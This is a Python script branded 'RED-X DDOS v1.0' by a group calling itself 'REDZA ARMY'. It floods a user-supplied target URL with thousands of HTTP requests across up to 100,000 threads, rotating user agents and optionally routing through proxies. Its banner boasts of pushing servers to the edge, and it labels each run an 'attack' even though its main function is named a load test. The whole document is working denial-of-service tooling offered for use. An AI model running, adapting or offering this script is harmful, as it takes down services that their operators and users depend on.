import requests
import threading
import time
import random
import json
import csv
from tqdm import tqdm
from colorama import Fore, Style

# ✅ ASCII Banner with Developer Info
RED_X_ATTACK_BANNER = r"""
  _____  ______ _____      __   __
 |  __ \|  ____|  __ \     \ \ / /
 | |__) | |__  | |  | |_____\ V / 
 |  _  /|  __| | |  | |______> <  
 | | \ \| |____| |__| |     / . \ 
 |_|  \_\______|_____/     /_/ \_\
                                  
🚀 REDZA ARMY | RED-X DDOS v1.0 🚀
👨‍💻 Developer: MD SOFIKUL ISLAM
🌐 GitHub: MR-D4RK-OFFICIAL
📧 Contact: mrd4rk@gmail.com
🎭 TEAM: CIVILIAN CYBER EXPERTS FORCE  
🔥 "RED-X ATTACK – Unleash the power, push servers to the edge!"
⚡ "REDZA ARMY | RED-X DDOS v1.0 🚀, unstoppable performance!"
"""

print(f"{Fore.RED}{RED_X_ATTACK_BANNER}{Style.RESET_ALL}")

# ✅ Random User-Agents List
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# ✅ Dynamic Proxy List
PROXIES = [
    "http://proxy1.com:8080",
    "http://proxy2.com:8080",
    "http://proxy3.com:8080"
]

# ✅ Load Test Function
def load_test(url, num_requests=15000, num_threads=1000, use_proxy=False):
    success, failed = 0, 0
    response_times = []
    headers = {"User-Agent": random.choice(USER_AGENTS)}

    # ✅ Auto-detect Method
    try:
        test_response = requests.get(url, timeout=5)
        method = "GET"
        if test_response.status_code in [200, 405]:
            method = "POST"
    except:
        print(f"{Fore.RED}Invalid URL or Server Down!{Style.RESET_ALL}")
        return

    print(f"{Fore.YELLOW}Detected Method: {method}{Style.RESET_ALL}")

    # ✅ Worker Function
    def worker():
        nonlocal success, failed
        session = requests.Session()

        for _ in range(num_requests // num_threads):
            try:
                proxy = {"http": random.choice(PROXIES)} if use_proxy else None
                start_time = time.time()
                response = session.request(method, url, headers=headers, proxies=proxy, timeout=3)
                elapsed_time = time.time() - start_time
                response_times.append(elapsed_time)

                if response.status_code == 200:
                    success += 1
                else:
                    failed += 1
            except:
                failed += 1

    # ✅ Thread Execution
    print(f"{Fore.CYAN}Starting RED-X ATTACK...{Style.RESET_ALL}")
    threads = []
    for _ in tqdm(range(num_threads), desc="Launching Threads", ascii=True, ncols=80):
        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    # ✅ রিপোর্ট
    avg_response_time = sum(response_times) / len(response_times) if len(response_times) > 0 else 0
    print(f"\n{Fore.GREEN}RED-X ATTACK Completed!{Style.RESET_ALL}")
    print(f"Total Requests: {num_requests}")
    print(f"Successful Requests: {success}")
    print(f"Failed Requests: {failed}")
    print(f"Average Response Time: {avg_response_time:.4f} seconds")

    # ✅ Save Report Option
    save_report = input(f"{Fore.YELLOW}Save Report? (y/n): {Style.RESET_ALL}").lower()
    if save_report == 'y':
        report_data = {
            "Total Requests": num_requests,
            "Successful Requests": success,
            "Failed Requests": failed,
            "Average Response Time": avg_response_time
        }
        
        # ✅ Save as JSON
        with open("red_x_attack_report.json", "w") as json_file:
            json.dump(report_data, json_file, indent=4)

        # ✅ Save as CSV
        with open("red_x_attack_report.csv", "w", newline='') as csv_file:
            writer = csv.writer(csv_file)
            writer.writerow(["Total Requests", "Successful Requests", "Failed Requests", "Avg Response Time"])
            writer.writerow([num_requests, success, failed, avg_response_time])

        print(f"{Fore.GREEN}Report saved as 'red_x_attack_report.json' & 'red_x_attack_report.csv'!{Style.RESET_ALL}")

# ✅ ইউজার ইনপুট নিয়ে লোড টেস্ট চালানো
if __name__ == "__main__":
    target_url = input(f"{Fore.YELLOW}Enter Target URL: {Style.RESET_ALL}")
    total_requests = int(input(f"{Fore.YELLOW}Number of Requests (Default: 15000): {Style.RESET_ALL}") or 15000)
    thread_count = int(input(f"{Fore.YELLOW}Number of Threads (Default: 1000, Max: 100000): {Style.RESET_ALL}") or 1000)
    proxy_option = input(f"{Fore.YELLOW}Use Proxy? (y/n): {Style.RESET_ALL}").lower() == 'y'

    if thread_count > 100000:
        print(f"{Fore.RED}Thread count too high! Setting to max (100000).{Style.RESET_ALL}")
        thread_count = 100000

    load_test(target_url, num_requests=total_requests, num_threads=thread_count, use_proxy=proxy_option)
